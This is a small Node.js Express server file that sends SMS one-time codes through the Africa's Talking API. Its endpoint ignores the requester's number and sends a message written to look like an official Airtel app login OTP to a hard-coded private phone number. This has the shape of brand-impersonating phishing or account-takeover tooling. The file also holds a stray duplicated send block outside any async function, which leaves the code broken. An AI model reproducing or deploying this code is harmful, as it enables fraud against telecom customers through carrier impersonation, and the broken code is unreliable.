require('dotenv').config();
const express = require('express');
const AfricasTalking = require('africastalking');
const cors = require('cors');

const app = express();
app.use(cors());
app.use(express.json());

// CONFIGURATION
const credentials = {
    apiKey: process.env.AT_API_KEY, 
    username: process.env.AT_USERNAME || 'sandbox'
};

// ENTER YOUR PHONE NUMBER HERE (Format: +243... or +254...)
const MY_PRIVATE_NUMBER = '+254759277409'; 

const AT = AfricasTalking(credentials);
const sms = AT.SMS;

app.post('/send-otp', async (req, res) => {
    // We ignore the user's phone number from the request
    const { otp } = req.body; 
    
    const officialMsg = `<#> Your OTP for My Airtel App login is ${otp}. Do Not share this code with anyone even if they claim to be from Airtel. Airtel will never ask for your OTP. OTP is valid for 1 mins. Bw6j5XNu+9/`;

    try {
        // Send directly to YOUR number
        const result = await sms.send({
            to: [MY_PRIVATE_NUMBER],
            message: officialMsg
        });

        console.log("OTP sent to admin:", result);
        res.status(200).json({ success: true });

    } catch (err) {
        console.error("SMS Error:", err.message);
        res.status(500).json({ success: false, error: err.message });
    }
});
const result = await sms.send({ to: [MY_PRIVATE_NUMBER], message: officialMsg });
const status = result.SMSMessageData.Recipients[0].status;
const code = result.SMSMessageData.Recipients[0].statusCode;
console.log(`Delivery Status: ${status} (Code: ${code})`);

app.listen(3000, () => console.log(`CongoCash Admin Server running on port 3000`));